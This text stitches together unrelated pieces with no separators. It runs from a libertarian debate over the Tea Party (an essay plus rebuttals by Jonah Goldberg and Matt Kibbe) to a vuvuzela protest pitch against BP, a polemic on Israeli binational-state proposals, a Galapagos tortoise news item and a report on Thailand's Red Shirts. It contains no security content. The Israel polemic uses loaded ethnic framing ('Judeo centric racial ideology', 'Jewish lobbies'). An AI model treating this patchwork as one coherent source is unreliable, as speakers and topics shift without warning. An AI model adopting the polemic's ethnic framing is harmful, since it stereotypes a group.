And in the single most depressing result of the whole poll , 57 percent of Tea Party supporters expressed a favorable opinion of the big - government president George W. Bush — as compared to Americans overall , 58 percent of whom gave Bush an unfavorable rating .
It should come as no surprise , then , that Tea Partiers hold distinctly unlibertarian views on a wide variety of issues .
According to the Times poll , 82 percent think illegal immigration is a very serious problem , and supporters of decreasing legal immigration outnumber those who want to liberalize immigration by 42 to 14 percent .
Only 16 percent favor gay marriage ( compared to 39 percent of the country at large ) , and 40 percent call for no legal recognition of same - sex unions .
Meanwhile , 77 percent support either banning abortions outright or making them more difficult to obtain .
But at least the Tea Partiers are dedicated to reining in government spending , right ?
After all , it 's the movement 's defining issue .
Well , put me down as a skeptic .
If you really care about restraining the growth of government , the number one priority has to be restructuring the budget - busting Medicare program .
Yet during the health care debate the GOP sank to shameless demagoguery in defending Medicare 's sanctity .
The short - term goal was to score points against ObamaCare , but the most likely long - term effect was to make needed reforms even more difficult to achieve .
And how did Tea Partiers , and movement conservatives generally , respond to this irresponsible pandering ?
They scarcely said boo .
Authoritarian and Unpopular
Notwithstanding the return of libertarian rhetoric , the right today is a fundamentally illiberal and authoritarian movement .
It endorses the systematic use of torture .
It defends unchecked presidential power over matters of national security .
It excuses massive violations of Americans ' civil liberties committed in the name of fighting terrorism .
It supports bloated military budgets , preventive war , and open - ended , nation - building occupations .
It calls for repressive immigration policies .
Far from being anti-statist , it glorifies and romanticizes the agencies of government coercion : the police and the military .
It opposes abortion rights .
It opposes marriage equality .
It panders to creationism .
It routinely questions the patriotism of its opponents .
It traffics in outlandish conspiracy theories .
If you 're serious about individual freedom and limited government , you cannot stand with this movement .
In any event , conservatism in its current incarnation looks like a political dead end .
Its wildly overheated rhetoric , with cries of socialism and dark hints of impending dictatorship , alienates the moderate center of American public opinion even as it thrills the hardcore base .
That base , meanwhile , is in long - term demographic decline .
White , married , churchgoing , with kids — all those categories associated with a right - of - center orientation have been shrinking as a percent of the population , and all are expected to continue shrinking .
In analyzing the impact of demographic change on the 2008 election , the journalist Ron Brownstein looked at six basic groups : whites with college degrees , whites without degrees , African - Americans , Hispanics , Asians , and other minorities .
If each of those group 's share of the electorate had remained unchanged since 1992 , McCain would have beaten Obama by 2 percentage points instead of losing by 7 .
At the same time , younger Americans have decisively repudiated the contemporary right 's illiberal social values .
The Pew Research Center 's 2007 survey of Americans aged 18 – 25 , dubbed " Generation Next , " is illustrative .
Pew 's polling reveals that young adults are dramatically less religious and less nationalist than their elders .
Twenty percent say they are not religious , compared to only 11 percent of Americans 26 or older .
They favor evolution over creationism by a 63 to 33 margin .
Supporters of gay marriage in this age group narrowly outnumber opponents ( 47 to 46 percent ) , while among everyone older opponents carry the day by a 64–30 spread .
Among young adults , 52 percent say immigrants strengthen our country , while 38 percent say they are a burden ; by contrast , Americans 26 and up embrace the anti-immigrant view by a 42–39 margin .
In the rising generation , only 29 percent agree that " using overwhelming force is the best way to defeat terrorism , " while 67 percent think that " relying too much on military force leads to hatred and more terrorism . "
Among Americans 26 and older , though , hawks beat doves 49 to 41 .
God -and - country populism may still appeal to a large number of Americans ( though certainly not a majority ) , but its future looks bleak .
Back in the Cold War , when socialism remained a living ideal and totalitarianism was a leading force in world affairs , an anti-socialist alliance between libertarians and social conservatives may have made sense .
It does n't anymore .
Does that mean I think that libertarians should ally with the left instead ?
No , that 's equally unappealing .
I do believe that libertarian ideas are better expressed in the language of liberalism rather than that of conservatism .
But it 's clear enough that for now and the foreseeable future , the left is no more viable a home for libertarians than is the right .
The blunt truth is that people with libertarian sympathies are politically homeless .
The best thing we can do is face up to that fact and act accordingly .
That means taking the libertarian movement in a new direction : attempting to claim the center of American politics .
If that move were successful , ideas of a distinctly libertarian cast would define the views of a critical swing constituency that politicians on the left and right would have to compete for .
Make no mistake , though : relocating to the center would make for a very different movement than the one we 've got now .
The organized libertarian movement began with the goal of offering a radical alternative to conservatism and liberalism .
But ever since the main vehicle of that aspiration , the Libertarian Party , fizzled into irrelevance in the 1980s , the movement has tilted heavily to the right .
However much individual libertarians like to think they transcend the left - right divide , the actual operating strategy of organized libertarianism has been fusionism .
In particular , a great deal of libertarian talent and energy has gone into building a " free market " movement of organizations that focus more or less exclusively on economic issues .
These organizations include fundraising groups such as the Club for Growth , activist outfits such as FreedomWorks and Americans for Prosperity , legal shops such as the Institute for Justice , and state - level think tanks such as the Mackinac Center and the Goldwater Institute .
By steering clear of social issues and foreign policy , the free - market movement has shunted aside the questions that divide libertarians from conservatives and instead institutionalized the ground they seem to share .
Expressly libertarian writers have spent much more time engaging conservative audiences than reaching out to liberals .
They have written more frequently for right - wing outlets such as National Review , The Washington Times , and The Wall Street Journal than for their counterparts on the left .
They have regularly identified with the Goldwater - Reagan current of conservatism , notwithstanding the profound differences between that strain and libertarian thinking on a number of fronts .
And they have often couched libertarian arguments in conservative terms , venerating the timeless wisdom of America 's founding principles while conveniently ignoring the fact that another set of founding principles included the enslavement of blacks , subjugation of women , and expropriation of Indian lands .
Declaring independence from the right would require big changes .
Cooperation with the right on free - market causes would need to be supplemented by an equivalent level of cooperation with the left on personal freedom , civil liberties , and foreign policy issues .
Funding for political candidates should be reserved for politicians whose commitment to individual freedom goes beyond economic issues .
In the resources they deploy , the causes they support , the language they use , and the politicians they back , libertarians should be making the point that their differences with the right are every bit as important as their differences with the left .
The first step , though , is recognizing the problem .
Right now , like it or not , the libertarian movement is a part of the vast right - wing conspiracy — a distinctive and dissident part , to be sure , but a part all the same .
As a result , our ideals are being tainted and undermined through guilt by association .
It 's time for libertarians to break ranks and stand on our own .

Disparaging conservatives is no substitute for recognizing that only the right takes economic libertarianism seriously .
By Jonah Goldberg
Brink Lindsey is both brilliant and sensible .
That 's part of why I admire his work so much .
But I must say I find those qualities largely missing in his case for Liberaltarianism 2.0 .
Under Liberaltarianism 1.0 , Lindsey endeavored to forge a new fusionism between liberals and libertarians .
The old alliance between conservatives and libertarians was either ill - conceived from the outset or had reached the point of diminishing returns .
An " honest survey of the past half - century shows a much better match between libertarian means and progressive ends , " he famously wrote in December 2006 in The New Republic ( the magazine that should be blamed for the un-euphonious moniker " liberaltarian , " which , alas , has stuck ) .
Lindsey proposed " a refashioned liberalism that incorporate [s ] key libertarian concerns and insights " and " make [s ] possible a truly progressive politics once again . "
As flawed as I thought that project was , I wished Lindsey luck in at least some of his endeavors .
While I think severing the fusionist bond with conservatism would be bad for libertarians , conservatives , and the country , at the same time I would like nothing more than to see libertarians convince liberals to become less statist and less culturally bullying .
Moreover , his core point had much merit :
The wealth and freedom created by libertarian policies are the best means toward " progressive " ( at least in his benign use of the term ) ends .
But that 's all moot now because under Liberaltarianism 2.0 , Lindsey does n't call for a new " lib- lib " fusionism so much as a libertarian breakaway movement whereby libertarianism fashions itself as the " new center . "
This new move is apparently necessary because Lindsey has realized how inhospitable progressive soil is to the flower of libertarianism .
Suffused with deference to planners , reverence for the state , and a predilection for running other peoples ' lives , contemporary liberalism is largely ( though not entirely ) liberalism in name only .
Lindsey concedes this fact in an awkward way when he writes : " I do believe that libertarian ideas are better suited to the language of liberalism rather than that of conservatism . "
Which is another way of saying that liberals talk a good game about freedom , but their policies have nothing to do with it .
Meanwhile , maybe Lindsey is right that the language of conservatism needs to be reinvigorated with libertarianism , but it seems to me that 's exactly what the Tea Partiers he so disdains are busy doing .
Many of Lindsey 's core assumptions about conservatism 's relationship with libertarianism are just wrong .
For starters , why should libertarianism be so hostile to culturally conservative values ?
Is n't libertarianism about freedom , including the freedom to live conservatively if that 's what people choose ?
Secularism in politics is a perfectly admirable and libertarian value , but using the state to impose secularism on society is not .
One gets the sense from Lindsey that the greater threat to freedom in this country comes from conservatives imposing their " benighted " religious outlook on the citizenry , rather than from the state scrubbing society of religion while imposing narrow conceptions of " diversity " on every institution and hamlet .
Which worldview has more state and corporate power behind it in America today , Christianity or — for want of a better term — political correctness ?
Lindsey is supposed to be making the case for freedom , and yet so much of his uncharacteristically intemperate essay simply reads like he has chosen sides in the culture war and thinks that a host of political and policy questions should therefore be settled .
Not all of Lindsey 's complaints about the right and the GOP are without merit , but there 's so much ill - willed tendentiousness and ad hominem embedded in his description of political reality , it 's hard not to conclude that his emotions have gotten the better of him .
Again and again , Lindsey grabs the most convenient , negative , and often clichéd , interpretations of Tea Parties , " birthers , " rightwing paranoia and the usual parade of horribles ( sorry : " gargoyles " ) in order to make his case that libertarians need to divorce themselves from conservatives .
Worse , he singles out sins of the right as if they are not also sins of the left — and libertarians as well .
( I would submit that the distribution of " outlandish conspiracy theories " is fairly uniform across the ideological landscape . )
For instance , I was particularly sorry to see him buy into this " epistemic closure " nonsense .
I 'd strongly argue that he 's simply wrong on the facts about David Frum 's departure from the American Enterprise Institute .
But even if he were n't , are we really to believe that the Cato Institute is more accommodating of heterodox ideas within the framework of libertarian thought ?
I would be curious to see how long a scholar at Cato would endure after coming out in favor of , say , socialized medicine .
And pray tell , when said scholar was given the heave - ho , would Lindsey decry the " intolerant groupthink " that led to the decision ?
I would n't call that " epistemic closure , " but I am at a loss as to why Lindsey would n't .
As for Bruce Bartlett 's wildly overplayed plight , it 's at least worth noting that the think tank he was cut loose from could just as easily be described as libertarian as conservative .
It 's hardly as if the free - market National Center for Policy Analysis has ever been a bastion of social conservatism .
Lindsey 's telling insinuation that the libertarian position is de facto pro–abortion rights would draw objections from those many people who describe themselves as pro-life libertarians .
More practically , I think Lindsey misapprehends the " libertarianism " of actual American voters .
Even if the majority of people who ( accurately ) describe themselves as libertarians favor legalized abortion , it is quite clearly not the case that most care about the issue very much .
Meanwhile , a great many of the conservatives who are willing to votefor libertarians do care about it very much .
I do n't know what Brink Lindsey thinks of Ron and Rand Paul , but it is quite obvious that their political fortunes would be nil were they not pro-life .
Either their popularity with conservative Republicans suggests that the right is n't nearly so hostile to libertarianism as Lindsey thinks or it means that the Pauls have sold their souls to the party of Comstockish illiberalism .
There 's real merit to Lindsey 's claim that the " spirit of freedom is cosmopolitan . "
But today 's champions of cosmopolitanism are hardly champions of freedom and devotees of the quintessentially cosmopolitan libertarian Albert J. Nock .
Rather , they are the transnational progressive technocrats of Davos and the U.N. who , with increasing frequency , express contempt for democratic sovereignty because the people can't be trusted to handle such problems as climate change .
Lindsey makes a perfectly fine and correct observation that libertarians — at least true - blue ones — are politically homeless .
But it 's worth stressing that this is not the case where it actually matters most : economics .
I am perfectly willing to concede that the GOP 's free - market record has been fraught and festooned with disappointments and betrayals .
But at the intellectual level , even among most of the people Lindsey describes as " gargoyles , " economic libertarianism remains largely synonymous with economic conservatism .
The Mount Rushmore of libertarian economics — Hayek , Friedman , Mises , Hazlitt , et al — quite simply is the Mount Rushmore of conservative economics .
Cato 's economic prescriptions are respected by only one of the major political parties , and it's not the Democrats .
And yet , as a matter of practical politics , Lindsey would have libertarian spokesmen and advocates alienate conservatives in the hope that this would earn credibility with liberals .
It seems far more likely that liberals would pocket libertarian attacks on the right — of the sort found in Lindsey 's essay — while continuing to ignore libertarian arguments on economics and other key areas of public policy .
Left - wing environmentalists will not suddenly embrace property rights because libertarians vilify the Christian Right .
But the Christian Right may well stop listening to libertarians if they all started talking the way Lindsey does here .
Lastly , this talk of turning libertarianism into centrism is intriguing but no less ludicrous for it .
Simply put , centrists are n't libertarians and libertarians are n't centrists .
Ending the drug war is at the heart of contemporary libertarianism ( and has long been the official position of the " benighted " National Review , by the way ) .
But how does Lindsey plan on making that centrist ?
How will he make an open - borders immigration policy centrist ?
Social Security privatization ?
Free - market health care ?
I know Cato has invested heavily in arguing otherwise , but the reality is that centrists , just like almost everybody else , hold libertarian views on some issues and not on others .
And many views held by libertarians simply are not centrist .
Like it or not , in America , the more libertarian you are on most economic questions , the more " right wing " you are .
Period .
( But it is not always true that being libertarian on social issues makes you " left wing . "
Progressives embrace speech codes , racial quotas , state intrusions into the right of association , etc. )
If you take all of Lindsey 's talk of being " centrist " and replace it with " popular , " it clarifies his argument enormously .
Basically , Lindsey wants full - blown libertarianism to be popular .
I do too !
But no amount of wordplay , poll - data - torturing , or bridge - burning will make this philosophy genuinely popular , never mind the new hinge for our two - party system .
This is not an argument , it 's a wish .
Wishful thinking also lurks under his claim that the right is dying away .
This is not only untrue as a matter of public opinion ( as of this writing , polls show women , independents , etc. moving back to the GOP ) , but it 's untrue as a matter of policy as well .
One of the main reasons conservatives have emphasized their " illiberal " policies on such issues as national security and abortion is that they are popular ( even , dare I say it , centrist ) .
Nowhere does Lindsey provide evidence that support for , say , military tribunals is unpopular , because he can't .
The Obama administration has been learning this lesson the hard way .
In fact , both parties have emphasized their more illiberal facades in recent years .
Nonetheless , I would still dispute that the GOP is less libertarian today than it was , say , at the beginning of Bush 's first term , when the libertarian - rebuking " compassionate conservatism " was all the rage .
I wish Lindsey had spent a lot less time disparaging conservatives and aping the punditry of The New York Times and more time concentrating on the philosophical argument behind Liberaltarianism 2.0 .
It 's a fascinating topic with many avenues for agreement and disagreement .
Personally , I think he has it wrong in his attitudes toward religion and social conservatism .
From the founding , religion was a great engine for liberty .
Our constitutional order rests on the conviction that we are endowed by our creator with certain rights .
Both the abolitionist and civil rights movements were religious in nature .
As for social conservatism , I think the real way to deal with Lindsey 's disdain for it is to pursue a more plausible and principled solution to the problems affecting both libertarianism and the country : federalism .
As Thomas Jefferson knew , big cities will always be cosmopolitan .
But there 's no reason why one narrow definition of cosmopolitanism needs to be imposed across the land .
Social conservatives and libertine libertarians — and some practical progressives — should be able to find common cause in a campaign that allows people to live the way they want to live in communities that reflect their values .
But that is a subject for another day and , hopefully , Liberaltarianism 3.0 .

Drink Your Tea
How could you not celebrate the spontaneous emergence of a decentralized movement aimed at rolling back big government ?
By Matt Kibbe
I can't help but wonder what planet Brink Lindsey has been living on for the last 18 months .
Lindsey 's harangue against the good men and women who make up the Tea Party movement — utterly dismissive of their important work against an entrenched political establishment — seems disconnected from reality .
This massive grassroots revolt against big government is the greatest opportunity that advocates of limited government have seen in generations , yet libertarian intellectuals like Lindsey seem content to sit on the sidelines and nitpick .
While the Tea Party builds a whole new infrastructure to house a massive community organized in defense of individual liberty and constitutionally constrained government , Lindsey would rather quibble over the color palette of the wall tiles in the guest bathroom .
His attitude is too typical , I fear .
Lindsey views the world from the rarified vantage point of someone perched in a perfectly calibrated , climate - controlled Ivory Tower .
From that high up he can't possibly see what is actually happening on the ground .
Casually confusing the terms " conservative , " " Republican , " and " Tea Party , " Lindsey borrows liberally from the left 's caricature of knuckle - draggers to knock down one strawman at a time .
He 's made a hash of the whole thing , but I 'll just make a few observations from the vantage point of someone who , as part of FreedomWorks , has been working with the Tea Party movement from its inception .
Lindsey grants some value in our opposition to government - run health care , allowing that " at least some conservatives have n't forgotten their signature move " as the Loyal Opposition to the Democrats ' wild expansion of government .
But where was he when this movement was being born out of principled disgust with Republican spending , with the corruption of earmarks as a source of campaign financing , and most notably in opposition to the TARP bailout ?
What is now called the Tea Party was forged during the first bailout , when angry citizens actually killed the first TARP proposal on the House floor by standing up and pushing back against a Republican president .
We all could have used more help then , before the bill became law , opposing the most outrageous expansion of government power in my lifetime .
That genie's not going back in the bottle .
When it mattered most , many think tank intellectuals were scarcely seen or heard from .
Lindsey says that true libertarianism is far more " cosmopolitan " than the rabble - rousers he sees on the streets .
That sounds more than a bit like a certain president I could name , a guy who wants America to be more like Europe .
Lindsey even ridicules those of us who venerate " the timeless wisdom of America 's founding principles . "
I for one hope we maintain our difference from Europe in continuing to live by the radical principles of individual rights and limits on collective government power .
Is that trite ?
If so , I got my triteness from a guy named Howard Roark : " Our country , the noblest country in the history of men , was based on the principle of individualism , the principle of man 's ' inalienable rights . '
It was a country where a man was free to seek his own happiness , to gain and produce , not to give up and renounce ; to prosper , not to starve ; to achieve , not to plunder ; to hold as his highest possession a sense of his personal value , and as his highest virtue his self - respect . "
Call me provincial , but I always loved that speech .
I suppose fictional characters are not serious intellectual leaders , though .
But who is , exactly ?
Practicing conservatism in the worst sense of the term , Lindsey pines for the days prior to the Internet and talk radio when network oligarchs and taxpayer - funded television forced the right to rely on a few " intellectual champions " of " sheer brilliance " who covered for the inelegance of the unwashed masses behind them .
Today , Lindsey worries , serious intellectuals " do n't call the shots . "
The best of the bunch , like his friends Bruce Bartlett and David Frum , have been sacked by the enforcers of " intolerant groupthink . "
Bartlett , a former Reagan official , is quite popular these days in the White House and on the left because of his vocal support for a value added tax , which he defends on grounds that " the U.S. needs a money machine " to fund the spending requirements of big government .
Frum , a former speechwriter for President George W. Bush , was particularly outraged by the recent vanquishing of the " perfectly good " conservative Sen.
Robert Bennett ( R - Utah ) by the Tea Party hordes .
Anticipating Bennett 's defeat , state GOP delegates , mostly new to the political process , chanted " TARP , TARP , TARP ! " from the convention floor .
The now –lame duck senator had unapologetically voted for the Wall Street bailout , aggressively defended Senate appropriators ' culture of earmarks , and introduced health care reform legislation requiring that all Americans buy government - approved health insurance .
It may be intolerant to say so , but these are all intolerable policy ideas , and the Tea Party movement is n't tolerating them .
Down here on terra firma , things look dramatically different from what Lindsey so dislikes .
From my perspective , the Tea Party movement is a beautiful chaos , or as F.A.
Hayek would put it , a spontaneous order .
Ours is a leaderless , decentralized grassroots movement made up of people who believe in freedom , in the government not spending money it does not have , and in the specialness of our constitutional republic .
They have arisen from their couches and kitchen tables and self - organized a potent countervailing force to the cozy collusion of political expediency , big government , and special interests .
One of the virtues of this decentralized world today is that citizens are no longer dependent on old - school institutions such as Congress , television networks , and even think tanks for information and good ideas .
Like the Tea Party movement itself , access to information is completely decentralized by infinite sources online .
Like the discovery process that determines prices in unfettered markets , these informal networks take advantage of what the philosopher Michael Polanyi called " personal knowledge . "
Bloggers and citizen activists on the Internet now gather these bits of knowledge and serve as the clearinghouse for the veracity of facts and the salience of good ideas .
Do Tea Partiers read ?
You bet they do , and with a focus and discipline fitting a peoples ' paradigm shift away from big - government conservatism .
One woman who marched in D.C. on September 12 , 2009 , had draped a big white banner , almost as big as she was , over the crowd control barricade .
It stated , succinctly : " Read Thomas Sowell . "
They listen to Glenn Beck and study Saul Alinsky .
They also read Rand , Friedman , and Mises .
They even read the Constitution of the United States , as timeless as it is , risking the erudite wrath of their cosmopolitan betters .
The Tea Party movement , if sustained , has the potential to take America back from an entrenched establishment of big spenders , political careerists , and rent - seeking corporations .
The values that animate us all — lower taxes , less government , and more freedom — is a big philosophical tent set at the very center of American politics .
Brink , you should come on down and join us .
You might get your hands dirty , but the good people of the Tea Party could sure use the help .

This might be the best Kickstarter project ever .
BP is not feeling the pain they are causing in the Gulf .
BP is spending millions on PR .
In order to put a bit of public pressure on them , we plan to buy 100 vuvuzelas and hire 100 vuvuzela players off Craigslist to play in front of BP 's International Headquarters in London for an entire work day .
Ideally , the players will keep coming back every day until they fix the gusher .

Budget : $ 2,000 = $ 1,000 for the vuvuzela protest ; $ 1,000 for the Gulf Disaster Fund
Budget is set at $ 2000 for now , which will be enough to buy 100 vuvuzelas at $ 6.50 a pop ( plus shipping ) , and leave some left for hiring some people to manage the crowds .
Hopefully ( and likely ) we can find people to play for free ( plus they get a free vuvuzela ) .
In which case , we 'll use the remaining funds to buy more vuvuzelas and find even more players .
As the Israelis are becoming conscious of their inevitable tragic circumstances , a final desperate attempt to rescue the Zionist project has come to life .
Astonishingly enough it is the Israeli right that is now pushing for ‘ one binational State . ’
It is pretty staggering to find out that while the Israeli so - called ‘ left ’ is locked within the 1967 territorial paradigm that is fueled by Judeo centric racial ideology , it is actually the hawkish Zionist thinkers who are willing to move the discourse forward .
In a mind provoking piece Noam Sheizaf outlines in Haaretz the new revolutionary Israeli idea .
However , I will maintain at this stage that the new Zionist call for ‘ one binational state ’ suggests that Zionist ideology is on its last leg .
Israel has come to realise its inevitable end .
And amidst its terminal conditions Israel tries to buy time .
Israel should apply its law to “ Judea and Samaria and grant citizenship to 1.5 million Palestinians , ” says Moshe Arens , a former Israeli defense minister , a top leader in the Likud party and a political patron of Prime Minister Benjamin Netanyahu .
Arens is not put off by those who slander him for promoting the idea of a binational Jewish - Palestinian state .
" We are already a binational state , " he says .
This approach is now being advocated by leading figures in the Likud and amongst the settlers .
A year ago , Uri Elitzur , former chairman of the Yesha Council of Settlements and Netanyahu 's bureau chief in his first term as prime minister , published an article in the settlers ' journal Nekuda calling for the onset of a process , at the conclusion of which the ( West Bank ) Palestinians will have " a blue ID card ( like Israelis ) , yellow license plates ( like Israelis ) , National Insurance and the right to vote for the Knesset . "
Emily Amrousi , a former spokesperson for the Yesha Council , also takes part in meetings between settlers and Palestinians and speaks explicitly of " one land in which the children of settlers and the children of Palestinians will be bused to school together . "
This Zionist political novelty does n’t take me by complete surprise .
Unlike the Jewish left that is tribally orientated both in Israel and in the West , the right wing Zionist philosophy was grounded on a dream of an eternal bond between the Jew and the alleged ‘ promised land ’ .
In Zion the Jew was supposed to transcend oneself beyond the race and the tribe .
Israel was there to demolish the ghetto wall .
As it happened , in practice , Israel had become the biggest ghetto in Jewish history .
However , there is a clear trap here .
As much as the peace loving Zionist hawks seem to champion Palestinian civil rights , the vision of a ‘ one binational state ’ is still totally Judeo centric .
The Israeli advocates of the one binational state are not talking about a neutral " state of all its citizens " , nor about " Israstine " with a flag showing a crescent and a Shield of David .
One state still means a sovereign Jewish state , but in a more complex reality , and inspired by the vision of a “ democratic Jewish state ” without an occupation and without apartheid , without fences and separations .
One may wonder at this stage what the notion of “ Jewish democratic state ” stands for .
It is obviously an empty signifier , there is no such a thing as Jewish democracy .
As far as I remember Democracy was born in Athens rather than Jerusalem .
And yet , the dream is compelling .
In such a state , “ Jews will be able to live in Hebron and pray at the Tomb of the Patriarchs , and a Palestinian from Ramallah will be able to serve as an ambassador and live in Tel Aviv or simply enjoy ice cream on the city 's seashore . ”
It is clear beyond doubt that a coin has dropped .
Some Israeli hawks have come to realise that the occupation cannot be maintained forever .
They were also quick to grasp that , in the long run , the separation wall put an end to the Zionist expansionist program .
They also gather that the negative exposure of Jewish lobbies in the West will eventually lead to the down scaling of Israeli political maneuvering .
However , the Zionist tribal orientation is never too difficult to trace .
When Elitzur was asked “ What do you say to the allegations that you have joined the radical left ? ” he was quick to reveal his political mantra .
" There 's a clear separation between us .
I am talking about a Jewish state , the state of the Jewish people , which will contain a large Arab minority .
The left is talking about an Arab state containing a Jewish minority , even if they do not explicitly think that .
The leftist demonstrators in ( the West Bank village of ) Bil'in have totally joined the Palestinian cause . "
I guess that this what it is all about .
The Israeli hawks want to counter the inevitable ' demographic disaster ' .
They would offer West Bank Palestinians Israeli ID cards , and offer them to “ enjoy ice cream in Tel Aviv ” as long as they are kept as a minority .
The Israeli hawks ignore Gaza and the right of return .
In practice they dismiss the Palestinian cause for they are certain that the Jewish one is superior .
In short , this is not a solution or a resolution .
It is just another Zionist spin that is planted in our discourse in order to disseminate confusion .
Scientists are reintroducing Giant tortoises to the islands of the Galapagos in a dramatic conservation effort .
The reptiles — they can grow to over six feet long , weigh over 500 pounds and can live over 150 years — were nearly brought to extinction when sailors and pirates killed them for their oil and meat in the 18th and 19th centuries .
In the latest effort , 39 sterile tortoises were released onto the northern - most island of Pinta in early July .
This initial population was sterilized “ because it is n’t appropriate that they reproduce , being the product themselves of crosses that do n’t belong to the original tortoise subspecies of the Galapagos , ” said biologist Washington Tapia of Galápagos National Park to Tierramerica .
If the population thrives , fertile Española animals will be introduced to the island .
“ A team of park rangers , biologists , herpetologists , botanists and veterinarians from Galápagos National Park , the Houston Zoo and State University of New York ’s College of Environmental Science and Forestry oversaw the release , ” according to the report .
A student group with GPS monitoring will further follow their health and migration patterns .
Only 11 of the original 15 Galapagos tortoise species remain , but a successful effort of captive breeding has brought them back from the brink of extinction .
Scientists told Tierramerica that there were between 5,000 and 10,000 tortoises on Pinta alone over 200 years ago .
The Pinta species was wiped out — save for one male , who has since been named Lonesome George because there are no more females with which he can mate .
Lonesome George , who was found in 1971 , now lives out his life at a reserve on the neighboring island of Santa Cruz at the Charles Darwin Foundation .
Darwin ’s observations of various animals on the Galapagos Islands , including giant tortoises , led to his theory of natural selection and his “ On the Origin of Species . ” ( According to Darwin ’s journal , he and his team of sailors also ate salted tortoise meat during his voyages on the HMS Beagle . )
The conservation effort has been underway for over 30 years and has been very successful on other Galapagos islands .
Before the 39 tortoises could be released on Pinta , over 40,000 invasive goats had to be killed .
Just three goats released on the island in 1951 exploded into a population of over 40,000 , destroying native vegetation .
The final goat was killed in 2003 , and native plant life has recuperated .
On the island of Española , conservation efforts have led to a thriving , reproducing population of over 1,500 tortoises , according to Guardian.co.uk .
“ Tortoises have begun to play their role as ecosystem engineers , ” said Tapia .
“ We can say with certainty that the ecological integrity of Española is being re-established . ”

Red Shirts ' barricade prior to the bloody May 19 , 2010 , military crackdown .

July 11 , 2010 --
On July 6 , the Thai government approved the extension of an emergency decree in 19 provinces , which includes many in the heartland of the pro-democracy Red Shirts in the country ’s north - east .
The extension came a day after the Brussels - based International Crisis Group ( ICG ) recommended the government immediately lift the decree and hold fresh elections .
But Prime Minister Abhisit Vejajiva , who came to power through the army ’s intervention , crushed hopes for new elections weeks ago .
There have been tireless efforts to silence critical voices before and after the bloody crackdown on the Red Shirts in May .
The International Crisis Group said in a July 5 report that more than 2200 websites have been shut down for alleged violations to the Computer Crime Act since the state of emergency was imposed on April 7 .
In rural provinces , authorities have intensified royalist campaigning since the crackdown .
Some village heads in the north - east ( or Isan ) have received two types of forms from the interior ministry .
The first one is for the collection of signatures from the population for an oath of loyalty to Thailand ’s monarchy .
The oath reads : “ This person wants to show their willingness to worship the monarchy … and to protect the monarchy with his or her life . ”
A village head in Kalasin province said : “ I was told to collect 300 signatures in my village .
But I ’m afraid I could n’t because some of the 500 villagers actually reside in other areas . ”
The second form is for “ joining the ‘ monarchy protection group ’ ” .
It instructs village heads to “ organise ” 20 people to “ implement ” the royalist oath .
The idea appears to be to organise a type of royalist village militia .
Villagers , many of whom are Red Shirt supporters , are disturbed by the forms .
To justify its murderous crackdown , in which more than 90 people were killed between March and May , the government accused the Red Shirts of being against the monarchy .
In fact , the Red Shirt movement did not oppose the monarchy , but simply demanded the unelected government resign and allow new elections .
A 55 - year - old villager , Chuan ( name changed ) , told me : “ We always respect our monarchy .
I do n’t know why we should sign this paper . ”
Despite non-stop talk of “ reconciliation ” by Abhisit , his regime has continued to persecute his critics .
Besides detaining central Red Shirt leaders and hundreds of protesters , arrest warrants have been issued for 819 activists , Matichon newspaper said on June 10 .
Of these , 787 were for people from the provinces .
Forty - two year - old Luen Sisupho , from Sakon Nakorn , is one of those on the run .
He received a summons from police ordering him to turn himself in by May 25 , after which an arrest warrant was to be issued .
Luen is a local activist from the Assembly of the Poor .
He has never voted for a party associated with former prime minister Thaksin Shinawatra , who is supported by the Red Shirts .
Luen had distanced himself from the Red Shirt movement until March .
“ I could no longer disagree with what Red Shirts were demanding ” , he said .
“ Dissolution of the parliament and new elections are very democratic demands , are n’t they ?
The government has lost the hearts and minds of people , whereas the Red Shirts have won more .
There will be more people who join the next protests , I bet . ”
There are signs the Red Shirt movement has been swelled by the government ’s repression .
One example is 22 - year - old Akkaradej Khankaew from Kalasin province , who was one of six protesters killed in the Pathuwanaram temple in May .
His aunt , Intaracham Inphum , said he had started watching the pro-Red Shirt P - Channel last year after government repression .
“ My nephew became interested in what was going on in the country ” , said a grieving Intaracham in her nephew ’s room , which features a picture of the Thai king and queen .
We joined the Bangkok protest together this year .
I came home in early April , but my nephew stayed and finally got killed . ”
Historically , Isan has been a centre of rebellion .
It was here the Communist Party of Thailand guerrilla movement was launched in 1965 and was active until the 1980s .
The communist insurgency , which occurred in various parts of the country , is now history .
But the “ Red Zones ” from the communists ' struggle appear to have be revived by the Red Shirts movement .
Fifty - eight - year - old Khitisak Posawant was once a communist and is now a Red Shirt in Pakchong village in Mukdahan province .
He is proud to have been part of the Bangkok protests for democracy this year .
Out of about 200 households of his village , nearly half joined the Bangkok protests .
“ My generation is well aware about brutality of Thai armed forces , because of the experience of communist struggle in the region . ”
Fifty - seven - year - old Yon Ngonsuk , another Red Shirt supporter from the same village , was n’t shy about talking about his past role in the anti-communist counter - insurgency .
Yon served in the Volunteer Defence Corps , the biggest paramilitary forces during the anti-communist campaign .
He said soldiers were willing to shoot people then , as they did in the May 19 bloody crackdown .
“ We did n’t know who was a communist or not ” , Yon said .
“ But in an operation , we had to think everyone was a communists .
It ’s similar to the way Abhisit accused Red Shirts of being terrorists without clarification . ”
Yon said he did n’t choose to join the paramilitaries .
At 18 , he was arrested by armed forces while helping communist guerrillas and forced to enter military training .
The slogan
Yon heard from his captors almost four decades ago was the same as that broadcast by army speakers to the Red Shirt camp in Bangkok during the crackdown — that all Thais should love each other and not fight .
“ Initially , they did n’t say communists were bad .
Instead they said we were all Thai . ”
Such patriotic love disappeared , however , once soldiers got orders to shoot .
Yon was instructed to shoot - to - kill anyone he came across on sight .
He was discharged from the unit in the early 1990s and returned to normal life .
“ Even though I was with the military for 20 years , I really hate the army seeing what they ’ve done against protesters who ask for democracy .
I want to fight .
Whenever there ’s repression , we want to fight more . ”
Isan , the poorest region in Thailand , has produced many conscripts , whose education was often terminated before grade nine .
Such a fault line raises the possibility of a family tragedy — with conscript soldiers set against poor protesters from the same region .
Fifty - eight - year - old Pravit ( name changed ) is a Red Shirt supporter from Kalasin .
He spent uneasy days and nights while taking part in the months - long protests in Bangkok .
It was not his fear of repression that disturbed him , but the chance of a violent confrontation with his youngest son , 22 - year - old Thongchai .
Like many young men in Thailand ’s impoverished north , Thongchai has been on military service as a conscript since November .
Pravit was constantly contacting his son , whose normal duty was securing Suvarnaphumi airport , to find out if his unit would be dispatched anywhere near the protest site .
In the end , Pravit returned home from Bangkok on April 7 , before the bloody crackdown .
He had planned to return to Bangkok , but did n’t dare to after deadly clashes on April 10 , in which his son took part .
